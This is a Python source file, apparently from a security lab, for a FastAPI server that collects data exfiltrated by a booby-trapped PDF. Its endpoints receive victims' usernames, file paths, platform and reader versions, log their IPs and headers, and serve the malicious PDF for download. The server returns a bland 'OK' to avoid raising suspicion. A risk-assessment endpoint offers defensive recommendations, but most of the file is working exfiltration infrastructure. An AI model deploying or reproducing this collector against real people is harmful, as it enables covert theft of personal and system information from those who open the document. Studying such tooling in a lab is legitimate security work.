#!/usr/bin/env python3
"""
FastAPI Data Collection Endpoint with Pydantic Models
Educational tool to receive data from malicious PDF for security research

Requirements:
    pip install fastapi uvicorn pydantic

Usage:
    python fastapi_collector.py

    or with uvicorn directly:
    uvicorn fastapi_collector:app --host 0.0.0.0 --port 8000
"""

from fastapi import FastAPI, Request, Query, HTTPException
from fastapi.responses import JSONResponse, PlainTextResponse, FileResponse
from datetime import datetime
import json
import logging
from pathlib import Path
from typing import Optional, List, Dict, Any
import os

from models import (
    CollectionEntry,
    PostCollectionEntry,
    FormCollectionEntry,
    ExfiltratedData,
    DataResponse,
    StatsResponse,
    ClearDataResponse,
    SuccessResponse,
    ServiceInfo,
    RequestMethod,
    RiskAssessment,
    RiskLevel,
    ThreatIndicators
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('pdf_exfiltration.log'),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

app = FastAPI(
    title="PDF Exfiltration Collector",
    description="Educational endpoint for collecting data from malicious PDF experiments with Pydantic models",
    version="2.0.0"
)

# Storage for collected data (using Pydantic models)
collected_entries: List[CollectionEntry] = []


@app.get("/", response_model=ServiceInfo)
async def root():
    """Root endpoint with information"""
    return ServiceInfo(
        endpoints={
            "/collect": "Receives exfiltrated data via GET (query params)",
            "/collect-post": "Receives exfiltrated data via POST (JSON body)",
            "/submit": "Receives form submissions",
            "/data": "View all collected data",
            "/stats": "View statistics",
            "/risk-assessment": "Get risk assessment of collected data",
            "/download-pdf": "Download the malicious PDF document",
            "/docs": "Interactive API documentation"
        }
    )


@app.get("/collect")
async def collect_data_get(
    request: Request,
    reader: Optional[str] = Query(None, description="PDF Reader version"),
    platform: Optional[str] = Query(None, description="Operating system platform"),
    language: Optional[str] = Query(None, description="System language"),
    username: Optional[str] = Query(None, description="Username"),
    viewer_version: Optional[str] = Query(None, description="Viewer version"),
    app_version: Optional[str] = Query(None, description="Application version"),
    screen_width: Optional[str] = Query(None, description="Screen width"),
    screen_height: Optional[str] = Query(None, description="Screen height"),
    timezone: Optional[str] = Query(None, alias="timezone_offset", description="System timezone offset"),
    doc_title: Optional[str] = Query(None, description="Document title"),
    doc_author: Optional[str] = Query(None, description="Document author"),
    doc_filename: Optional[str] = Query(None, description="Document filename"),
    doc_path: Optional[str] = Query(None, description="Document file path"),
    num_pages: Optional[str] = Query(None, description="Number of pages")
):
    """
    Collect data via GET request (simulates app.launchURL method)
    PDF JavaScript uses this method most commonly
    """

    # Collect all query parameters
    all_params = dict(request.query_params)

    # Get client information
    client_host = request.client.host if request.client else "unknown"
    user_agent = request.headers.get("user-agent", "unknown")

    # Create ExfiltratedData model from query params
    exfiltrated_data = ExfiltratedData(**all_params)

    # Create CollectionEntry with Pydantic model
    entry = CollectionEntry(
        timestamp=datetime.now(),
        method=RequestMethod.GET,
        client_ip=client_host,
        user_agent=user_agent,
        collected_data=exfiltrated_data,
        headers=dict(request.headers)
    )

    # Store data
    collected_entries.append(entry)

    # Log the collection
    logger.info(f"Data collected via GET from {client_host}")
    logger.info(f"Parameters: {exfiltrated_data.model_dump_json(indent=2, exclude_none=True)}")

    # Save to file
    _save_to_file(entry)

    # Return innocent-looking response (to avoid suspicion)
    return PlainTextResponse(
        content="OK",
        status_code=200
    )


@app.post("/collect-post", response_model=SuccessResponse)
async def collect_data_post(request: Request):
    """
    Collect data via POST request (alternative method)
    Less common in PDF JavaScript but more stealthy
    """

    try:
        # Try to parse JSON body
        body = await request.json()
    except:
        # If not JSON, get raw body
        body_bytes = await request.body()
        body = body_bytes.decode('utf-8', errors='ignore')

    # Get client information
    client_host = request.client.host if request.client else "unknown"
    user_agent = request.headers.get("user-agent", "unknown")

    # Create PostCollectionEntry with Pydantic model
    entry = PostCollectionEntry(
        timestamp=datetime.now(),
        method=RequestMethod.POST,
        client_ip=client_host,
        user_agent=user_agent,
        body=body,
        headers=dict(request.headers)
    )

    # Store data (convert to dict for compatibility)
    collected_entries.append(entry)  # type: ignore

    # Log the collection
    logger.info(f"Data collected via POST from {client_host}")
    logger.info(f"Body: {json.dumps(body if isinstance(body, dict) else str(body), indent=2)}")

    # Save to file
    _save_to_file(entry)

    # Return success response
    return SuccessResponse(message="Data received successfully")


@app.post("/submit")
async def submit_form(request: Request):
    """
    Alternative endpoint for form submission
    Simulates /SubmitForm action in PDFs
    """
    try:
        # Parse form data
        form_data = await request.form()
        data = dict(form_data)
    except:
        # Fallback to body
        body_bytes = await request.body()
        data = body_bytes.decode('utf-8', errors='ignore')

    # Get client information
    client_host = request.client.host if request.client else "unknown"

    # Create FormCollectionEntry with Pydantic model
    entry = FormCollectionEntry(
        timestamp=datetime.now(),
        method=RequestMethod.POST_FORM,
        client_ip=client_host,
        form_data=data,
        headers=dict(request.headers)
    )

    # Store data
    collected_entries.append(entry)  # type: ignore

    # Log
    logger.info(f"Form submitted from {client_host}")
    logger.info(f"Form data: {json.dumps(data if isinstance(data, dict) else str(data), indent=2)}")

    # Save to file
    _save_to_file(entry)

    return PlainTextResponse(content="Form received", status_code=200)


@app.get("/data", response_model=DataResponse)
async def view_data():
    """View all collected data"""
    # Convert Pydantic models to dicts for response
    data_list = [
        json.loads(entry.model_dump_json(exclude_none=True))
        for entry in collected_entries
    ]

    return DataResponse(
        total_entries=len(collected_entries),
        data=data_list
    )


@app.get("/data/categorized")
async def view_data_categorized():
    """View collected data organized by category"""
    categorized = []

    for entry in collected_entries:
        if isinstance(entry, CollectionEntry):
            categorized_data = entry.collected_data.to_categorized()
            categorized.append({
                "timestamp": entry.timestamp.isoformat(),
                "method": entry.method,
                "client_ip": entry.client_ip,
                "user_agent": entry.user_agent,
                "data": categorized_data
            })

    return {
        "total_entries": len(categorized),
        "categorized_data": categorized
    }


@app.get("/stats", response_model=StatsResponse)
async def view_stats():
    """View statistics about collected data"""
    if not collected_entries:
        return StatsResponse(
            total_entries=0,
            by_method={},
            by_ip={},
            first_seen=None,
            last_seen=None
        )

    # Calculate statistics
    methods: Dict[str, int] = {}
    ips: Dict[str, int] = {}

    for entry in collected_entries:
        method = entry.method.value
        methods[method] = methods.get(method, 0) + 1

        ip = entry.client_ip
        ips[ip] = ips.get(ip, 0) + 1

    return StatsResponse(
        total_entries=len(collected_entries),
        by_method=methods,
        by_ip=ips,
        first_seen=collected_entries[0].timestamp.isoformat(),
        last_seen=collected_entries[-1].timestamp.isoformat()
    )


@app.get("/risk-assessment", response_model=RiskAssessment)
async def risk_assessment():
    """
    Perform risk assessment on collected data
    Educational feature to understand threat severity
    """
    if not collected_entries:
        return RiskAssessment(
            risk_level=RiskLevel.LOW,
            score=0,
            indicators=ThreatIndicators(),
            recommendations=["No data collected yet"]
        )

    # Analyze collected data
    suspicious_paths = []
    exposed_usernames = []
    system_platforms = []
    vulnerable_readers = []

    for entry in collected_entries:
        if isinstance(entry, CollectionEntry):
            data = entry.collected_data

            # Check for exposed file paths
            if data.doc_path:
                suspicious_paths.append(data.doc_path)

            # Check for exposed usernames
            if data.username:
                exposed_usernames.append(data.username)

            # Track platforms
            if data.platform:
                system_platforms.append(data.platform)

            # Check for potentially vulnerable reader versions
            if data.viewer_version:
                vulnerable_readers.append(f"{data.reader} {data.viewer_version}")

    # Calculate risk score
    risk_score = 0
    risk_score += len(suspicious_paths) * 10
    risk_score += len(set(exposed_usernames)) * 15
    risk_score += len(collected_entries) * 5
    risk_score = min(risk_score, 100)  # Cap at 100

    # Determine risk level
    if risk_score < 20:
        risk_level = RiskLevel.LOW
    elif risk_score < 50:
        risk_level = RiskLevel.MEDIUM
    elif risk_score < 75:
        risk_level = RiskLevel.HIGH
    else:
        risk_level = RiskLevel.CRITICAL

    # Generate recommendations
    recommendations = [
        f"Total of {len(collected_entries)} exfiltration attempts detected",
        "Disable JavaScript in PDF readers",
        "Enable Protected Mode in PDF software",
        "Implement network egress filtering for PDF readers",
        "Provide user security awareness training"
    ]

    if suspicious_paths:
        recommendations.append(f"File system paths exposed: {len(suspicious_paths)} instances")

    if exposed_usernames:
        recommendations.append(f"Usernames exposed: {len(set(exposed_usernames))} unique users")

    return RiskAssessment(
        risk_level=risk_level,
        score=risk_score,
        indicators=ThreatIndicators(
            suspicious_paths=list(set(suspicious_paths)),
            exposed_usernames=list(set(exposed_usernames)),
            system_platforms=list(set(system_platforms)),
            vulnerable_readers=list(set(vulnerable_readers))
        ),
        recommendations=recommendations
    )


@app.delete("/data", response_model=ClearDataResponse)
async def clear_data():
    """Clear all collected data"""
    global collected_entries
    count = len(collected_entries)
    collected_entries = []
    logger.info("Collected data cleared")

    return ClearDataResponse(
        status="success",
        entries_cleared=count
    )


@app.get("/download-pdf")
async def download_pdf():
    """
    Download the malicious PDF document

    Educational use only - for testing and analysis purposes.
    The PDF contains JavaScript that exfiltrates system information.
    """
    # Look for malicious_document.pdf in current directory and parent
    possible_paths = [
        Path("malicious_document.pdf"),
        Path("../malicious_document.pdf"),
        Path("./lab2/malicious_document.pdf"),
    ]

    pdf_path = None
    for path in possible_paths:
        if path.exists():
            pdf_path = path
            break

    if not pdf_path:
        raise HTTPException(
            status_code=404,
            detail="Malicious PDF not found. Generate it first using: python create_malicious_pdf.py --url http://localhost:8000/collect"
        )

    logger.info(f"PDF download requested: {pdf_path}")

    return FileResponse(
        path=str(pdf_path),
        media_type="application/pdf",
        filename="malicious_document.pdf",
        headers={
            "Content-Disposition": "attachment; filename=malicious_document.pdf",
            "X-Content-Type-Options": "nosniff",
            "X-Warning": "Educational malware - handle with care"
        }
    )


def _save_to_file(entry):
    """Save entry to JSON file using Pydantic serialization"""
    try:
        file_path = Path("collected_data.json")

        # Load existing data
        if file_path.exists():
            with open(file_path, 'r') as f:
                data = json.load(f)
        else:
            data = []

        # Append new entry (convert Pydantic model to dict)
        entry_dict = json.loads(entry.model_dump_json(exclude_none=True))
        data.append(entry_dict)

        # Save back
        with open(file_path, 'w') as f:
            json.dump(data, f, indent=2)

    except Exception as e:
        logger.error(f"Error saving to file: {e}")


if __name__ == "__main__":
    import uvicorn

    print("=" * 70)
    print("PDF Exfiltration Collector Server v2.0 (with Pydantic)")
    print("=" * 70)
    print("\nStarting FastAPI server...")
    print("\nEndpoints:")
    print("  - http://localhost:8000/")
    print("  - http://localhost:8000/collect (GET - main endpoint)")
    print("  - http://localhost:8000/collect-post (POST)")
    print("  - http://localhost:8000/submit (Form submission)")
    print("  - http://localhost:8000/data (View collected data)")
    print("  - http://localhost:8000/data/categorized (View categorized data)")
    print("  - http://localhost:8000/stats (View statistics)")
    print("  - http://localhost:8000/risk-assessment (Risk assessment)")
    print("  - http://localhost:8000/download-pdf (Download malicious PDF)")
    print("  - http://localhost:8000/docs (Interactive API docs)")
    print("\nFor external access, use your IP address instead of localhost")
    print("Example: http://192.168.1.100:8000/collect")
    print("\nPress CTRL+C to stop\n")
    print("=" * 70)

    uvicorn.run(
        app,
        host="0.0.0.0",
        port=8000,
        log_level="info"
    )
